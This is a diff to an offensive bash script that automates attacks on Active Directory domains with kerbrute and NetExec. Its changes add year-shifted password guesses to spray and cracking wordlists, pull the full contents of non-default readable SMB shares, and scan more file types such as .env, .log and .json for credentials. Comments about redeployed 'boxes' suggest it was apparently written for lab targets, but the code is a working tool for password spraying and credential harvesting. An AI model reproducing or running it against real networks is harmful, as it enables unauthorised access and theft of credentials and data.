@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.18.3"
+readonly VERSION="1.19.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -292,6 +292,30 @@ add_secret() {
     FOUND_SECRETS["$p"]=1
     echo "$p" >>"$OUTDIR/found_passwords.txt"
     printf '%-30s  ⟵  %s\n' "$p" "$src" >>"$OUTDIR/credential_map.txt"
+    # If the secret embeds a year, expand sibling-year variants into the target
+    # wordlist so offline cracking + opt-in spray auto-adapt to the deployment
+    # year (boxes redeploy: Welcome2025! one season, Welcome2026! the next).
+    if [[ -n "${DOMAIN_WL:-}" && -f "${DOMAIN_WL:-/nonexistent}" ]]; then
+        local v
+        while IFS= read -r v; do
+            [[ -z "$v" || "$v" == "$p" ]] && continue
+            grep -qxF -- "$v" "$DOMAIN_WL" 2>/dev/null || echo "$v" >>"$DOMAIN_WL"
+        done < <(year_variants "$p")
+    fi
+}
+
+# Emit year-shifted siblings of a string that embeds a 4-digit year, across a
+# window of current_year-3 .. current_year+1 (covers redeploys / clock skew /
+# "this box uses 2025 but the next deploy uses 2026"). Anything without a
+# 19xx/20xx year produces no output. e.g. Welcome2025! -> Welcome2024! …2026! …
+year_variants() {
+    local s="$1"
+    [[ "$s" =~ (19|20)[0-9][0-9] ]] || return 0
+    local matched="$BASH_REMATCH" now y
+    now=$(date +%Y)
+    for ((y=now-3; y<=now+1; y++)); do
+        echo "${s/$matched/$y}"
+    done
 }
 
 # Record a confirmed/working identity and how it was obtained (for the final map)
@@ -2399,6 +2423,36 @@ phase_share_loot() {
         EXCLUDE_EXTS="$skip_exts" EXCLUDE_FILTER="$skip_dirs" OUTPUT_FOLDER="$dl" 2>&1 \
         | tail -25 | tee -a "$LOGFILE"
 
+    # --- Non-default shares: pull WITHOUT the noise-extension filter ---------
+    # The exclude list above (log,dat,etl,evtx,db,sqlite…) exists to skip Windows
+    # profile/registry junk on default shares. But on a CUSTOM share (e.g. one
+    # literally named "Logs") those .log/.csv/.txt/.evtx files ARE the loot — the
+    # global filter was silently throwing the objective away. spider_plus has no
+    # per-share include, but its EXCLUDE_FILTER matches share names too, so we run
+    # a second relaxed pass that excludes the default readable shares
+    # (SYSVOL/NETLOGON/IPC$) and keeps only a media-binary extension filter. Net
+    # effect: every non-default readable share is pulled in full (≤MAX_FILE_SIZE)
+    # into the same loot dir, so all downstream harvesting/cracking covers it.
+    subsection "Non-default shares → full pull (noise filter relaxed)"
+    local readable; readable=$($NXC smb "$DCT" "${args[@]}" --shares --filter-shares read 2>&1 \
+        | sed -E 's/^[[:space:]]*[A-Z]+[[:space:]]+\S+[[:space:]]+[0-9]+[[:space:]]+\S+[[:space:]]+//' \
+        | awk 'NF>=1{print $1}')
+    local DEFAULT_SHARES='ADMIN\$|C\$|IPC\$|PRINT\$|FAX\$|SYSVOL|NETLOGON|Share|-----|Permissions'
+    local custom; custom=$(printf '%s\n' "$readable" | grep -viE "^(${DEFAULT_SHARES})$" | sort -u | sed '/^$/d')
+    if [[ -n "$custom" ]]; then
+        info "Custom readable share(s): $(echo $custom | tr '\n' ' ')"
+        # Exclude default readable shares by name + keep the junk-dir filter.
+        local cf_skip_dirs="sysvol,netlogon,ipc\$,${skip_dirs}"
+        # Minimal extension filter: only true binary media that cannot carry creds.
+        local cf_skip_exts="ico,png,jpg,jpeg,gif,bmp,svg,ttf,otf,woff,woff2,eot,mui,cat"
+        run "$NXC smb $DCT ${args[*]} -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 EXCLUDE_EXTS=$cf_skip_exts EXCLUDE_FILTER=$cf_skip_dirs OUTPUT_FOLDER=$dl"
+        $NXC smb "$DCT" "${args[@]}" -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 \
+            EXCLUDE_EXTS="$cf_skip_exts" EXCLUDE_FILTER="$cf_skip_dirs" OUTPUT_FOLDER="$dl" 2>&1 \
+            | tail -25 | tee -a "$LOGFILE"
+    else
+        info "No non-default readable shares (nothing beyond SYSVOL/NETLOGON/IPC\$)"
+    fi
+
     local files; files=$(find "$dl" -type f 2>/dev/null)
     [[ -z "$files" ]] && { info "No files downloaded from shares"; return; }
     loot "$(echo "$files" | wc -l) files pulled from shares → $dl"
@@ -2415,7 +2469,8 @@ phase_share_loot() {
         -not -ipath '*/sysvol/*' -not -ipath '*/policies/*' -not -ipath '*/AppData/*' \
         -not -iname 'desktop.ini' \
         \( -iname '*.txt' -o -iname '*.ini' -o -iname '*.config' \
-        -o -iname '*.xml' -o -iname '*.ps1' -o -iname '*.bat' -o -iname '*.conf' -o -iname '*.cnf' \) \
+        -o -iname '*.xml' -o -iname '*.ps1' -o -iname '*.bat' -o -iname '*.conf' -o -iname '*.cnf' \
+        -o -iname '*.log' -o -iname '*.csv' -o -iname '*.json' -o -iname '*.yml' -o -iname '*.yaml' -o -iname '*.env' \) \
         -exec cat {} + 2>/dev/null | harvest_secrets "shares"
 
     subsection "Cracking password-protected documents found on shares"
@@ -2661,15 +2716,24 @@ gen_domain_wordlist() {
     [[ -s "$out" ]] && { DOMAIN_WL="$out"; return; }
     [[ -z "$DOMAIN" ]] && return
     local short="${DOMAIN%%.*}"                       # corp.local -> corp
-    local yr; yr=$(date +%Y); local pyr=$((yr-1)) ; local ppyr=$((yr-2))
+    # Dynamic year window: current_year-2 .. current_year+1. Always relative to
+    # `date` (no hardcoded years to rot), and forward-looking by one so a box
+    # deployed/clocked slightly ahead is still covered.
+    local yr; yr=$(date +%Y)
+    local -a years=(); local d; for d in -2 -1 0 1; do years+=("$((yr+d))"); done
     local -a bases=("$short" "${short^}" "${short^^}")
     [[ -n "$DC_HOST" ]] && bases+=("$DC_HOST" "${DC_HOST^}")
     local -a seasons=(Spring Summer Autumn Fall Winter)
-    local -a suffix=("" "1" "12" "123" "1234" "!" "123!" "@123" "#1" "2024" "2025" "2026" "$yr" "$pyr" "${yr}!" "${pyr}!" "01")
+    local -a suffix=("" "1" "12" "123" "1234" "!" "123!" "@123" "#1" "01")
+    local y; for y in "${years[@]}"; do suffix+=("$y" "${y}!"); done
     { for b in "${bases[@]}"; do for s in "${suffix[@]}"; do echo "${b}${s}"; done; done
-      for se in "${seasons[@]}"; do for y in "$yr" "$pyr" "$ppyr"; do
+      for se in "${seasons[@]}"; do for y in "${years[@]}"; do
           echo "${se}${y}"; echo "${se}${y}!"; echo "${se}@${y}"; done; done
-      # Common corporate defaults
+      # Corporate defaults, with the year-bearing ones expanded across the window
+      for y in "${years[@]}"; do
+          echo "Welcome${y}"; echo "Welcome${y}!"; echo "Welcome@${y}"
+          echo "Password${y}"; echo "Password${y}!"
+          echo "${short^}${y}"; echo "${short^}${y}!"; echo "${short^}@${y}"; done
       printf '%s\n' Welcome1 Welcome1! Welcome123 Welcome123! Password1 Password1! \
           Password123 Password123! P@ssw0rd 'P@ssw0rd!' 'P@ssw0rd123' Changeme123 \
           Changeme123! Letmein123! Summer123! Company123! Admin123! Qwerty123!
